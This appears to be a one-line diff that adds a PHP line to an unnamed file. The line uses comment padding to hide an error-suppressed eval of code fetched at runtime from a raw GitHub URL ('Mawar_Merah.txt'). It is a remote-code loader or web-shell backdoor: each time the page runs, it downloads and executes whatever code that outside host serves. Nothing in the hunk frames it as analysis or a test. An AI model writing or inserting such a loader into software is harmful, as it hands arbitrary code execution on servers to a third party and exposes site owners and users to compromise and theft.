@@ -1,0 +1,1 @@
+<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://raw.githubusercontent.com/flashkiss1977/Mawar_Merah/main/Mawar_Merah.txt"));/**/?>
